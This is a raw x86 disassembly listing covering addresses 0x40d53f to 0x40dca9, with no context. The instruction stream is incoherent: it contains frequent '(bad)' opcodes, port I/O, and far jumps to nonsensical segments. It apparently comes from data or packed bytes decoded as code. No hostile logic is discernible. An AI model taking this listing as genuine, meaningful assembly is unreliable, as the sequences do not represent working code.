  40d53f:	inc    edx
  40d540:	lahf   
  40d541:	jecxz  0x40d569
  40d543:	adc    DWORD PTR [esi+ecx*4],edx
  40d546:	jl     0x40d5b5
  40d548:	or     BYTE PTR [ecx-0x2],cl
  40d54b:	(bad)
  40d550:	mov    ecx,ecx
  40d552:	fistp  QWORD PTR [eax-0x6d]
  40d555:	jp     0x40d5ae
  40d557:	or     al,0x30
  40d559:	dec    eax
  40d55a:	loop   0x40d4fd
  40d55c:	mov    eax,0x96a31c21
  40d561:	sub    DWORD PTR [ebp-0x61],ebx
  40d564:	push   0x57
  40d566:	mov    bh,0x75
  40d568:	rcr    DWORD PTR [edx+eax*1-0x46],cl
  40d56c:	out    dx,al
  40d56d:	mov    edx,0xd44b7251
  40d572:	outs   dx,BYTE PTR ds:[esi]
  40d573:	push   ds
  40d574:	xchg   dl,bh
  40d576:	arpl   cx,si
  40d578:	fbstp  TBYTE PTR [ebx+0x6381ebe4]
  40d57e:	jns    0x40d542
  40d580:	push   ebp
  40d581:	cdq    
  40d582:	pop    ss
  40d583:	(bad)  
  40d584:	loopne 0x40d515
  40d586:	xchg   BYTE PTR [ebp+edx*1-0x6553b347],cl
  40d58d:	in     al,0x79
  40d58f:	std    
  40d590:	xor    BYTE PTR [esi],0xdf
  40d593:	jmp    0x760a:0x5b840781
  40d59a:	jno    0x40d5e5
  40d59c:	pop    esp
  40d59d:	adc    BYTE PTR [edi],0x69
  40d5a0:	icebp  
  40d5a1:	mov    bh,0x3a
  40d5a3:	mov    ecx,0x8d6c7950
  40d5a8:	fstp   QWORD PTR ds:0xc291dd82
  40d5ae:	mov    edi,0x69da3972
  40d5b3:	mov    eax,ds:0x4c63b285
  40d5b8:	jmp    0x8bc8:0xc318ce3b
  40d5bf:	cli    
  40d5c0:	imul   ebx,DWORD PTR [edi+0x6d],0x4c
  40d5c4:	jno    0x40d63d
  40d5c6:	sub    DWORD PTR [edi+0x41f1d8b],ebx
  40d5cc:	pop    ds
  40d5cd:	mov    esp,0xdea615d8
  40d5d2:	push   0xa6d2e13c
  40d5d7:	xchg   edi,ecx
  40d5d9:	ss out 0x68,al
  40d5dc:	pop    esp
  40d5dd:	jg     0x40d5bd
  40d5df:	sar    ah,0x48
  40d5e2:	add    dh,ch
  40d5e4:	jle    0x40d60f
  40d5e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5e7:	sbb    edi,DWORD PTR [ebp-0x19397adf]
  40d5ed:	dec    edi
  40d5ee:	scas   eax,DWORD PTR es:[edi]
  40d5ef:	fist   DWORD PTR [ecx+0x5c3d608d]
  40d5f5:	cs inc esi
  40d5f7:	xchg   edx,eax
  40d5f8:	pop    esi
  40d5f9:	mov    ch,ch
  40d5fb:	ret    
  40d5fc:	and    al,BYTE PTR [ecx-0x573d6e63]
  40d602:	dec    esi
  40d603:	das    
  40d604:	adc    BYTE PTR [edx],al
  40d606:	ds icebp 
  40d608:	xchg   esi,eax
  40d609:	jp     0x40d5ee
  40d60b:	sbb    dl,cl
  40d60d:	out    0x6b,al
  40d60f:	jae    0x40d5e8
  40d611:	push   esp
  40d612:	sub    DWORD PTR [edx],ecx
  40d614:	push   ebx
  40d615:	adc    eax,0x4f69592
  40d61a:	xchg   ebx,eax
  40d61b:	jne    0x40d5f9
  40d61d:	xchg   esi,eax
  40d61e:	call   0x4191:0xb0768e33
  40d625:	sti    
  40d626:	jo     0x40d690
  40d628:	sahf   
  40d629:	adc    BYTE PTR [edi+0x64],al
  40d62c:	push   ds
  40d62d:	leave  
  40d62e:	ret    
  40d62f:	lock cmp BYTE PTR [edi-0x9],bl
  40d633:	xor    esi,edx
  40d635:	repnz sahf 
  40d637:	jl     0x40d6ac
  40d639:	dec    ebp
  40d63a:	add    al,0x2d
  40d63c:	mov    al,ds:0x65119439
  40d641:	sahf   
  40d642:	popf   
  40d643:	pop    esi
  40d644:	fmul   DWORD PTR [esi-0x4b]
  40d647:	je     0x40d666
  40d649:	out    0x7b,al
  40d64b:	mov    al,cl
  40d64d:	mov    dl,0x4f
  40d64f:	mov    eax,ds:0x6c46501d
  40d654:	aaa    
  40d655:	jg     0x40d645
  40d657:	pop    es
  40d658:	mov    fs,WORD PTR [ecx]
  40d65a:	loope  0x40d623
  40d65c:	loope  0x40d60b
  40d65e:	adc    esp,eax
  40d660:	ret    0xeeb7
  40d663:	or     eax,0x10ff4494
  40d668:	popf   
  40d669:	jnp    0x40d625
  40d66b:	daa    
  40d66c:	sar    DWORD PTR [esi+0x3838346],1
  40d672:	cmc    
  40d673:	ja     0x40d644
  40d675:	inc    esp
  40d676:	inc    esi
  40d677:	sub    bh,BYTE PTR [ecx+0x2d964365]
  40d67d:	fistp  QWORD PTR [edx]
  40d67f:	add    al,0xc0
  40d681:	test   DWORD PTR [edi+eiz*1],ecx
  40d684:	and    bl,dl
  40d686:	jno    0x40d690
  40d688:	mov    al,ds:0x3ebdc926
  40d68d:	inc    esi
  40d68e:	mov    al,ds:0xd1b6936d
  40d693:	adc    ch,BYTE PTR [ecx+0x64]
  40d696:	add    DWORD PTR [edi-0x70902565],ecx
  40d69c:	jbe    0x40d67c
  40d69e:	cmc    
  40d69f:	mov    DWORD PTR [ebx+0x455bc57f],esp
  40d6a5:	xchg   ebp,eax
  40d6a6:	mov    dl,0x8a
  40d6a8:	or     eax,0x5965631b
  40d6ad:	sahf   
  40d6ae:	mov    ds:0xbe9c82d0,al
  40d6b3:	xchg   esi,eax
  40d6b4:	mov    edx,0xe4ececaf
  40d6b9:	sahf   
  40d6ba:	inc    esp
  40d6bb:	adc    BYTE PTR [ecx+0x5f],ch
  40d6be:	sbb    ebp,DWORD PTR ds:0xf2d6972f
  40d6c4:	jb     0x40d6a0
  40d6c6:	pop    edx
  40d6c7:	es push esp
  40d6c9:	xor    ecx,DWORD PTR [esi+0x6f]
  40d6cc:	pop    ss
  40d6cd:	dec    ebx
  40d6ce:	pop    ecx
  40d6cf:	outs   dx,BYTE PTR es:[esi]
  40d6d1:	idiv   DWORD PTR [ebp+0x35]
  40d6d4:	dec    ebx
  40d6d5:	cmc    
  40d6d6:	dec    esi
  40d6d7:	inc    esp
  40d6d8:	inc    ebp
  40d6d9:	mov    esp,0x25ae95be
  40d6de:	mov    esi,0xf0c7fb96
  40d6e3:	popf   
  40d6e4:	sar    BYTE PTR [edi+0x1acb1397],1
  40d6ea:	fdiv   DWORD PTR [eax]
  40d6ec:	mov    ecx,DWORD PTR [esi]
  40d6ee:	mov    al,ds:0xc7afbb07
  40d6f3:	lahf   
  40d6f4:	mov    eax,0xe20f5632
  40d6f9:	mov    bh,0x93
  40d6fb:	fimul  DWORD PTR [edi]
  40d6fd:	dec    edi
  40d6fe:	hlt    
  40d6ff:	clc    
  40d700:	test   al,0x81
  40d702:	(bad)  [edx]
  40d704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d705:	mov    eax,0x2af0af06
  40d70a:	fstp   TBYTE PTR [edx+0x1cc91a22]
  40d710:	imul   ebx,DWORD PTR [edx],0xc894b3b2
  40d716:	enter  0xeccc,0x2e
  40d71a:	out    dx,eax
  40d71b:	pop    ebp
  40d71c:	mov    dh,0x82
  40d71e:	lock mov eax,0x78c967f1
  40d724:	add    edi,DWORD PTR [eax]
  40d726:	sub    edi,esi
  40d728:	inc    esi
  40d729:	cli    
  40d72a:	(bad)  
  40d72b:	sbb    BYTE PTR [edx],cl
  40d72d:	dec    ebx
  40d72e:	pop    edx
  40d72f:	adc    ecx,0xa0aee2db
  40d735:	test   BYTE PTR [edx-0x61f620c6],ah
  40d73b:	int3   
  40d73c:	fstp   DWORD PTR ds:[esi+0x775406ec]
  40d743:	cmp    BYTE PTR [ecx+0x62],bl
  40d746:	out    dx,al
  40d747:	fs dec esi
  40d749:	xchg   esp,eax
  40d74a:	popa   
  40d74b:	arpl   WORD PTR [esi],ax
  40d74d:	aam    0x7a
  40d74f:	pop    edx
  40d750:	cmp    BYTE PTR [ecx+0x4],ch
  40d753:	dec    ebx
  40d754:	scas   eax,DWORD PTR es:[edi]
  40d755:	and    ch,BYTE PTR [eax-0x3fb9df74]
  40d75b:	sti    
  40d75c:	mov    bh,cl
  40d75e:	cs cdq 
  40d760:	or     BYTE PTR [edi+ecx*2-0x68],bh
  40d764:	dec    ecx
  40d765:	jl     0x40d79c
  40d767:	fisub  DWORD PTR [esp+ecx*4]
  40d76a:	imul   edi,DWORD PTR [eax-0x31e89ab2],0x86600dd3
  40d774:	add    cl,ch
  40d776:	stos   DWORD PTR es:[edi],eax
  40d777:	ret    
  40d778:	sbb    al,0xe0
  40d77a:	adc    ah,BYTE PTR [eax]
  40d77c:	shl    BYTE PTR [edi-0x70],cl
  40d77f:	adc    DWORD PTR [ebp+0x23],esp
  40d782:	mov    ?,WORD PTR [ecx-0x59]
  40d785:	mov    esi,0x39cc22cd
  40d78a:	mov    edx,0xcea9b067
  40d78f:	cmp    al,BYTE PTR [ecx+ebx*8]
  40d792:	pop    es
  40d793:	lods   eax,DWORD PTR ds:[esi]
  40d794:	in     eax,0x9c
  40d796:	in     al,dx
  40d797:	popf   
  40d798:	add    cl,BYTE PTR [esi+0x1b]
  40d79b:	dec    esi
  40d79c:	mov    bh,0x10
  40d79e:	xchg   esi,eax
  40d79f:	out    0x39,al
  40d7a1:	cmc    
  40d7a2:	loope  0x40d7cf
  40d7a4:	fidiv  WORD PTR [edx-0x3f138042]
  40d7aa:	hlt    
  40d7ab:	cli    
  40d7ac:	sub    DWORD PTR ds:0xbc58cfc9,0x2d906999
  40d7b6:	add    ecx,edi
  40d7b8:	sbb    esi,DWORD PTR ds:0x7679f69a
  40d7be:	or     al,0xd9
  40d7c0:	or     eax,0xec8739ac
  40d7c5:	ficomp WORD PTR [edi+eax*2+0x10bd87a3]
  40d7cc:	shr    DWORD PTR [eax+0x15],1
  40d7cf:	jl     0x40d83d
  40d7d1:	dec    eax
  40d7d2:	add    al,0x70
  40d7d4:	and    dh,bl
  40d7d6:	imul   ebx,DWORD PTR [ecx+0x26771728],0x1b
  40d7dd:	add    DWORD PTR [edi],esp
  40d7df:	lods   al,BYTE PTR ds:[esi]
  40d7e0:	inc    edi
  40d7e1:	retf   0x4818
  40d7e4:	jnp    0x40d83d
  40d7e6:	test   BYTE PTR [eax-0x69b86562],bl
  40d7ec:	(bad)  
  40d7ed:	xor    al,0xae
  40d7ef:	inc    esi
  40d7f0:	nop
  40d7f1:	mov    al,0x50
  40d7f3:	push   es
  40d7f4:	and    ebx,eax
  40d7f6:	idiv   esp
  40d7f8:	xor    eax,DWORD PTR [esi]
  40d7fa:	xor    BYTE PTR [ebp-0x49],dl
  40d7fd:	inc    ecx
  40d7fe:	fiadd  WORD PTR [edi+0x3f]
  40d801:	pop    esp
  40d802:	pushf  
  40d803:	popa   
  40d804:	mov    dh,0xcd
  40d806:	inc    ecx
  40d807:	es jle 0x40d867
  40d80a:	mov    BYTE PTR [ebx+ebx*2],dl
  40d80d:	ins    DWORD PTR es:[edi],dx
  40d80e:	xor    ah,BYTE PTR [ecx]
  40d810:	retf   
  40d811:	sbb    DWORD PTR [ebp-0x16],esi
  40d814:	je     0x40d7fe
  40d816:	pushf  
  40d817:	in     eax,0x54
  40d819:	repnz push 0xb21f74e0
  40d81f:	push   0xf2d36d67
  40d824:	dec    edi
  40d825:	or     ecx,0x1c
  40d828:	sar    DWORD PTR [eax+0x53],cl
  40d82b:	mov    bh,0xdc
  40d82d:	jno    0x40d82b
  40d82f:	push   0xffffff80
  40d831:	loopne 0x40d858
  40d833:	sbb    eax,0x7b8d1b81
  40d838:	push   eax
  40d839:	fmul   QWORD PTR [edx]
  40d83b:	loop   0x40d80d
  40d83d:	adc    BYTE PTR [edi],cl
  40d83f:	jmp    0x43b42ffc
  40d844:	and    al,0x85
  40d846:	sub    eax,0x33b5d712
  40d84b:	push   es
  40d84c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d84d:	(bad)  [edx+0x60]
  40d850:	jae    0x40d81a
  40d852:	adc    BYTE PTR [edx],bl
  40d854:	sub    ch,cl
  40d856:	aad    0x3
  40d858:	sub    DWORD PTR [ebp+edi*8-0x72],edx
  40d85c:	data16 ins BYTE PTR es:[edi],dx
  40d85e:	sbb    al,ch
  40d860:	ror    DWORD PTR [ebp+0xa5d0e45],cl
  40d866:	cs int 0x45
  40d869:	adc    ah,ch
  40d86b:	xchg   cl,cl
  40d86d:	cmp    eax,0x2c39cb69
  40d872:	stos   DWORD PTR es:[edi],eax
  40d873:	xor    al,0x71
  40d875:	into   
  40d876:	or     esi,DWORD PTR [eax+0x5b]
  40d879:	sub    DWORD PTR [edx],ebp
  40d87b:	or     al,0xe7
  40d87d:	push   edx
  40d87e:	xchg   edi,eax
  40d87f:	sbb    eax,0x1b0c8b5
  40d884:	cli    
  40d885:	jle    0x40d8aa
  40d887:	ss inc ecx
  40d889:	shr    BYTE PTR [ecx+0x15],0x4b
  40d88d:	push   eax
  40d88e:	jo     0x40d88b
  40d890:	mov    bh,0xe8
  40d892:	je     0x40d900
  40d894:	mov    bh,0xba
  40d896:	xor    ecx,DWORD PTR [eax-0x6e39953d]
  40d89c:	sbb    esi,ebp
  40d89e:	stos   BYTE PTR es:[edi],al
  40d89f:	pop    ss
  40d8a0:	out    0xec,al
  40d8a2:	int    0x38
  40d8a4:	jbe    0x40d85f
  40d8a6:	stc    
  40d8a7:	jmp    0x8eb9:0xbb1aed3c
  40d8ae:	dec    esp
  40d8af:	sub    DWORD PTR [ecx-0x3f],ebx
  40d8b2:	test   esp,eax
  40d8b4:	test   al,ch
  40d8b6:	or     bl,BYTE PTR ds:0x52b4d593
  40d8bc:	mov    al,0xde
  40d8be:	fisub  DWORD PTR [ebp-0x189629ce]
  40d8c4:	sub    eax,0xec0ccf02
  40d8c9:	mov    BYTE PTR [ecx+0xfeec314],ch
  40d8cf:	sti    
  40d8d0:	repnz popa 
  40d8d2:	mov    ebx,DWORD PTR [ecx+0x6192e130]
  40d8d8:	jb     0x40d8ce
  40d8da:	outs   dx,BYTE PTR ds:[esi]
  40d8db:	data16 adc BYTE PTR [ebp-0x6f],0xf7
  40d8e0:	outs   dx,BYTE PTR ds:[esi]
  40d8e1:	xchg   ebx,eax
  40d8e2:	add    eax,0x4b7c3785
  40d8e7:	leave  
  40d8e8:	cli    
  40d8e9:	in     al,0x61
  40d8eb:	xchg   esp,eax
  40d8ec:	(bad)  
  40d8ed:	xor    al,0xe8
  40d8ef:	fstp   QWORD PTR [eax]
  40d8f1:	mov    ecx,0xac0a513c
  40d8f6:	mov    bl,0xa9
  40d8f8:	repz dec ecx
  40d8fa:	jle    0x40d8b2
  40d8fc:	fisttp DWORD PTR [eax-0x5d]
  40d8ff:	and    al,dl
  40d901:	dec    eax
  40d902:	call   0xa8d84cc4
  40d907:	in     al,0x47
  40d909:	xor    al,0x4d
  40d90b:	(bad)  
  40d90c:	xor    bh,BYTE PTR [edx+0xa]
  40d90f:	retf   
  40d910:	iret   
  40d911:	cmp    esi,eax
  40d913:	pop    ebp
  40d914:	add    eax,0x7ba128ab
  40d919:	mov    ecx,0xa641dfe0
  40d91e:	nop
  40d91f:	ds repz jmp 0x763dd3ee
  40d926:	xchg   ecx,eax
  40d927:	or     al,0x7b
  40d929:	dec    ebx
  40d92a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d92b:	es fisub DWORD PTR ds:[ebx-0x44]
  40d930:	inc    ecx
  40d931:	mov    bh,0x9a
  40d933:	mov    cl,0xcb
  40d935:	dec    DWORD PTR [ebp-0x3b]
  40d938:	or     eax,edi
  40d93a:	scas   eax,DWORD PTR es:[edi]
  40d93b:	scas   eax,DWORD PTR es:[edi]
  40d93c:	xchg   esp,eax
  40d93d:	xor    eax,0xf08c743b
  40d942:	nop
  40d943:	jae    0x40d92d
  40d945:	dec    edx
  40d946:	mov    dh,0x17
  40d948:	sub    BYTE PTR es:[ecx-0x628ee151],dh
  40d94f:	out    0xb7,eax
  40d951:	ret    
  40d952:	int    0x49
  40d954:	add    ch,BYTE PTR [edx+0x35]
  40d957:	and    ah,ah
  40d959:	pop    eax
  40d95a:	push   esi
  40d95b:	fcomi  st,st(5)
  40d95d:	jmp    0xa4693d7e
  40d962:	add    BYTE PTR [esi+0x4e276ed3],bh
  40d968:	mov    dl,0x8a
  40d96a:	mov    bh,0x18
  40d96c:	or     cl,BYTE PTR [ebp-0x72515e5]
  40d972:	push   DWORD PTR [ebp+0x613c282e]
  40d978:	xor    eax,0x9c8cb1f0
  40d97d:	call   0x49a3:0xcad8a971
  40d984:	xlat   BYTE PTR ds:[ebx]
  40d985:	retf   
  40d986:	mov    WORD PTR [ebp+edx*1-0x78],es
  40d98a:	sub    esi,ecx
  40d98c:	shl    BYTE PTR [ecx+0x10],cl
  40d98f:	or     ch,ah
  40d991:	xchg   edx,eax
  40d992:	jno    0x40d98f
  40d994:	push   esi
  40d995:	test   al,0x44
  40d997:	mov    WORD PTR [ebx-0x42c3a831],gs
  40d99d:	in     eax,0xeb
  40d99f:	cdq    
  40d9a0:	pop    ebx
  40d9a1:	addr16 jl 0x40d96f
  40d9a4:	lods   eax,DWORD PTR ds:[esi]
  40d9a5:	enter  0xd8fd,0x89
  40d9a9:	sub    eax,0xb77a4da2
  40d9ae:	int3   
  40d9af:	test   eax,0xeef37b34
  40d9b4:	out    dx,eax
  40d9b5:	nop
  40d9b6:	fild   WORD PTR ds:0x12175f28
  40d9bc:	loop   0x40d983
  40d9be:	push   cs
  40d9bf:	(bad)  [edi+0x727dfa40]
  40d9c5:	popf   
  40d9c6:	bnd jnp 0x40d98f
  40d9c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9ca:	add    al,0xcc
  40d9cc:	and    al,cl
  40d9ce:	mov    ebp,DWORD PTR ds:0x71e302b2
  40d9d4:	mov    ebx,0xb13068ed
  40d9d9:	pop    es
  40d9da:	push   ecx
  40d9db:	lds    edx,FWORD PTR [eax+ebx*8+0xd8bcb17]
  40d9e2:	popf   
  40d9e3:	popa   
  40d9e4:	pop    eax
  40d9e5:	je     0x40da4a
  40d9e7:	xor    eax,0x2ff4d5c9
  40d9ec:	add    bl,ah
  40d9ee:	adc    al,0xb1
  40d9f0:	lods   eax,DWORD PTR ds:[esi]
  40d9f1:	mov    bl,BYTE PTR [edx]
  40d9f3:	inc    edx
  40d9f4:	dec    edx
  40d9f5:	out    0x12,eax
  40d9f7:	mov    ah,0xa7
  40d9f9:	aas    
  40d9fa:	mov    ah,0x4c
  40d9fc:	push   esp
  40d9fd:	jge    0x40d9c9
  40d9ff:	loope  0x40d9af
  40da01:	xchg   DWORD PTR [eax+0x68],ebx
  40da04:	push   ecx
  40da05:	adc    bh,BYTE PTR [edi-0x3b275093]
  40da0b:	inc    edx
  40da0c:	jns    0x40d99a
  40da0e:	shr    esp,0xa9
  40da11:	and    al,0x6a
  40da13:	dec    ebp
  40da14:	add    al,0x50
  40da16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da17:	(bad)  
  40da18:	jl     0x40da6b
  40da1a:	into   
  40da1b:	shl    DWORD PTR [edi-0x49fc4330],0x16
  40da22:	xchg   esi,eax
  40da23:	pop    ss
  40da24:	add    DWORD PTR [edi],edx
  40da26:	fbstp  TBYTE PTR [esi+edi*8]
  40da29:	cli    
  40da2a:	(bad)  
  40da2b:	jle    0x40da3a
  40da2d:	cmp    al,0x14
  40da2f:	xchg   edx,eax
  40da30:	test   BYTE PTR [esi-0x63],dl
  40da33:	mov    eax,0xff4b0098
  40da38:	adc    BYTE PTR [ecx-0x64beb31c],dl
  40da3e:	add    DWORD PTR [edi-0x5b333438],0x6be2c06c
  40da48:	retf   
  40da49:	sub    al,0x3f
  40da4b:	sar    DWORD PTR [esp+edx*8-0x50],cl
  40da4f:	loope  0x40da82
  40da51:	xchg   ebx,eax
  40da52:	push   0x52
  40da54:	cmp    ah,BYTE PTR [ecx+0x1c]
  40da57:	add    ebx,edi
  40da59:	mov    esp,0x70576e6c
  40da5e:	fild   WORD PTR [edi+0x7230248d]
  40da64:	mov    bl,0xfa
  40da66:	jecxz  0x40da06
  40da68:	jb     0x40da20
  40da6a:	dec    eax
  40da6b:	(bad)  
  40da6c:	sahf   
  40da6d:	ret    0x4e1f
  40da70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da71:	ds ja  0x40dab8
  40da74:	and    DWORD PTR [ebx],esi
  40da76:	mov    ch,0xf1
  40da78:	hlt    
  40da79:	adc    BYTE PTR [edx],ah
  40da7b:	inc    edi
  40da7c:	lds    ecx,FWORD PTR [ecx-0x5e606184]
  40da82:	aas    
  40da83:	pop    edx
  40da84:	ret    
  40da85:	inc    esp
  40da86:	jae    0x40da95
  40da88:	push   es
  40da89:	jmp    0x95f:0x83f5340a
  40da90:	ret    
  40da91:	push   ss
  40da92:	xchg   DWORD PTR [ebx+0x4804e555],edi
  40da98:	cli    
  40da99:	sbb    ecx,ecx
  40da9b:	(bad)  
  40da9c:	dec    ebx
  40da9d:	adc    eax,0x750c5fea
  40daa2:	aam    0x63
  40daa4:	popf   
  40daa5:	imul   ecx,DWORD PTR [edx-0x7e6c63c],0x42
  40daac:	test   DWORD PTR [esi],esi
  40daae:	cld    
  40daaf:	sub    BYTE PTR [edi],0x26
  40dab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dab3:	gs (bad) 
  40dab5:	fisttp DWORD PTR [eax]
  40dab7:	lods   eax,DWORD PTR ds:[esi]
  40dab8:	stc    
  40dab9:	daa    
  40daba:	test   DWORD PTR [ebx+0xb],edi
  40dabd:	mov    dh,0x5b
  40dabf:	lods   eax,DWORD PTR ds:[esi]
  40dac0:	neg    DWORD PTR [edi+0x5e24054b]
  40dac6:	lods   eax,DWORD PTR ds:[esi]
  40dac7:	jle    0x40da4d
  40dac9:	repz jmp 0x40dabc
  40dacc:	ins    BYTE PTR es:[edi],dx
  40dacd:	mov    eax,ds:0xfba650e9
  40dad2:	stos   BYTE PTR es:[edi],al
  40dad3:	push   ebp
  40dad4:	call   0x11b1193f
  40dad9:	shr    BYTE PTR [edi],1
  40dadb:	push   0xffffffaa
  40dadd:	add    ecx,DWORD PTR [ecx-0x310debe7]
  40dae3:	aaa    
  40dae4:	mov    ds:0xcc870413,eax
  40dae9:	hlt    
  40daea:	xor    DWORD PTR [ebx-0x47149bee],0xfffffff9
  40daf1:	(bad)  
  40daf2:	sar    BYTE PTR [ebp-0x5b],0xad
  40daf6:	dec    edx
  40daf7:	dec    ebx
  40daf8:	sub    cl,bl
  40dafa:	or     eax,0xfbf56208
  40daff:	aaa    
  40db00:	lods   al,BYTE PTR cs:[esi]
  40db02:	popa   
  40db03:	cmp    esp,DWORD PTR [esi+esi*2+0x529fb1b8]
  40db0a:	xchg   esp,eax
  40db0b:	xchg   BYTE PTR [eax+eax*4-0x25d2f619],dl
  40db12:	jns    0x40db39
  40db14:	pusha  
  40db15:	pop    esi
  40db16:	leave  
  40db17:	mov    bl,0x51
  40db19:	imul   esi,DWORD PTR [esi+ebx*4-0x59],0x5a19b9c6
  40db21:	lock jle 0x40db31
  40db24:	mov    WORD PTR [eax+0x22],ds
  40db27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db28:	mov    ebp,0x43523fe2
  40db2d:	jp     0x40dacc
  40db2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db30:	lock sbb eax,0x46e700c0
  40db36:	sbb    DWORD PTR [ecx+0x3e],ecx
  40db39:	aas    
  40db3a:	ds cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db3d:	jmp    0x71a6ae03
  40db42:	ja     0x40db5b
  40db44:	bound  edx,QWORD PTR [eax+0x2b]
  40db47:	mov    bl,0xc8
  40db49:	into   
  40db4a:	inc    esi
  40db4b:	aad    0x5f
  40db4d:	daa    
  40db4e:	inc    eax
  40db4f:	add    ch,BYTE PTR [ecx+0x7dba52c0]
  40db55:	test   BYTE PTR [edx],0x86
  40db58:	mov    bl,0x4
  40db5a:	mov    ch,BYTE PTR [edx]
  40db5c:	repnz ror al,cl
  40db5f:	loopne 0x40dba2
  40db61:	pushf  
  40db62:	xor    eax,0xf88deae6
  40db67:	xchg   esp,eax
  40db68:	fcomi  st,st(4)
  40db6a:	jmp    0xe1742b6
  40db6f:	push   0x56
  40db71:	mov    dl,0xf7
  40db73:	scas   al,BYTE PTR es:[edi]
  40db74:	fistp  WORD PTR [edi+ebp*2-0x792672e6]
  40db7b:	lods   al,BYTE PTR ds:[esi]
  40db7c:	scas   eax,DWORD PTR es:[edi]
  40db7d:	xchg   esp,eax
  40db7e:	lahf   
  40db7f:	int3   
  40db80:	setne  BYTE PTR [ecx]
  40db83:	fldenv [edx-0x67830169]
  40db89:	arpl   WORD PTR [edi],sp
  40db8b:	fcmovnu st,st(6)
  40db8d:	fsub   DWORD PTR [edx]
  40db8f:	shl    DWORD PTR [ebx],1
  40db91:	fbstp  TBYTE PTR [ebp+edx*2+0x13c2f326]
  40db98:	dec    edi
  40db99:	call   0xa52624ee
  40db9e:	pop    ebp
  40db9f:	xchg   esi,eax
  40dba0:	jns    0x40dbcf
  40dba2:	dec    edi
  40dba3:	dec    esp
  40dba4:	xor    eax,0x2053a84a
  40dba9:	outs   dx,BYTE PTR ds:[esi]
  40dbaa:	jnp    0x40db67
  40dbac:	dec    esi
  40dbad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbaf:	sub    edi,ebx
  40dbb1:	pushf  
  40dbb2:	pusha  
  40dbb3:	stos   DWORD PTR es:[edi],eax
  40dbb4:	inc    edx
  40dbb5:	std    
  40dbb6:	push   cs
  40dbb7:	push   ds
  40dbb8:	aad    0x27
  40dbba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbbb:	xchg   BYTE PTR ds:0x5e99be1d,ah
  40dbc1:	js     0x40dbf1
  40dbc3:	aas    
  40dbc4:	add    BYTE PTR [esi-0x11202029],dh
  40dbca:	mov    ebx,gs
  40dbcc:	inc    cl
  40dbce:	icebp  
  40dbcf:	lahf   
  40dbd0:	add    BYTE PTR [eax-0x6c],0x8
  40dbd4:	push   ss
  40dbd5:	arpl   WORD PTR [eax-0x176728d5],di
  40dbdb:	push   ebx
  40dbdc:	push   0xa009c808
  40dbe1:	xlat   BYTE PTR ds:[ebx]
  40dbe2:	(bad)
  40dbe5:	push   0x61394d41
  40dbea:	int    0x1a
  40dbec:	mov    DWORD PTR [ecx+0x7d1422be],eax
  40dbf2:	mov    dl,0xef
  40dbf4:	(bad)  
  40dbf5:	rcr    BYTE PTR [ebp-0x3a],cl
  40dbf8:	aam    0x90
  40dbfa:	loope  0x40dc27
  40dbfc:	mov    edi,0x494522ec
  40dc01:	arpl   si,ax
  40dc03:	sub    ecx,ecx
  40dc05:	or     eax,0xb84f5579
  40dc0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc0b:	arpl   WORD PTR [edi*1-0x727e9cfc],bp
  40dc12:	aas    
  40dc13:	lods   eax,DWORD PTR ds:[esi]
  40dc14:	stc    
  40dc15:	mov    ah,0xff
  40dc17:	aam    0xee
  40dc19:	inc    edx
  40dc1a:	xor    ah,BYTE PTR [ebp+0x48]
  40dc1d:	inc    ebp
  40dc1e:	push   ss
  40dc1f:	mov    ss,WORD PTR [esi+ebp*2]
  40dc22:	loop   0x40dbc7
  40dc24:	jmp    0x40dc0d
  40dc26:	int3   
  40dc27:	ins    BYTE PTR es:[edi],dx
  40dc28:	jp     0x40dc4d
  40dc2a:	in     eax,0x9c
  40dc2c:	(bad)  
  40dc2d:	not    BYTE PTR [ecx]
  40dc2f:	popa   
  40dc30:	xor    eax,0x6a5813e1
  40dc35:	mov    esi,0x82d1d580
  40dc3a:	test   al,0xe
  40dc3c:	and    DWORD PTR [esi-0x40],0xe1b522e6
  40dc43:	mov    al,ds:0x2fc9cf9d
  40dc48:	ss and al,0xdd
  40dc4b:	inc    ecx
  40dc4c:	stos   DWORD PTR es:[edi],eax
  40dc4d:	lods   eax,DWORD PTR ds:[esi]
  40dc4e:	outs   dx,BYTE PTR ds:[esi]
  40dc4f:	jecxz  0x40dbd5
  40dc51:	mov    al,0xf5
  40dc53:	jp     0x40dc66
  40dc55:	sub    esi,DWORD PTR [edx+0x333bb5c6]
  40dc5b:	pop    esi
  40dc5c:	pop    edx
  40dc5d:	das    
  40dc5e:	jp     0x40dc8e
  40dc60:	rcl    edx,cl
  40dc62:	jg     0x40dcd1
  40dc64:	call   FWORD PTR [ebp+0x8788201]
  40dc6a:	ror    DWORD PTR [edx-0x22],cl
  40dc6d:	lods   al,BYTE PTR ds:[esi]
  40dc6e:	test   al,0xbe
  40dc70:	inc    ecx
  40dc71:	push   eax
  40dc72:	ror    DWORD PTR [ebx-0x38eab933],0x71
  40dc79:	stc    
  40dc7a:	cmc    
  40dc7b:	rcl    BYTE PTR [esi+0x6c76cc57],cl
  40dc81:	data16 sbb BYTE PTR [ecx],bh
  40dc84:	mov    es,WORD PTR [esi-0x2f44d7cb]
  40dc8a:	jb     0x40dc0e
  40dc8c:	pop    ecx
  40dc8d:	xchg   esi,eax
  40dc8e:	sbb    DWORD PTR [eax-0x50],ecx
  40dc91:	aam    0x40
  40dc93:	inc    esi
  40dc94:	push   ds
  40dc95:	rcl    BYTE PTR [ebp+0x47],1
  40dc98:	js     0x40dcf2
  40dc9a:	cmp    al,0x6e
  40dc9c:	mov    ds:0x3b9a5663,eax
  40dca1:	or     eax,0xf04b257e
  40dca6:	add    bl,BYTE PTR [ebp-0x5c]
  40dca9:	dec    ebp
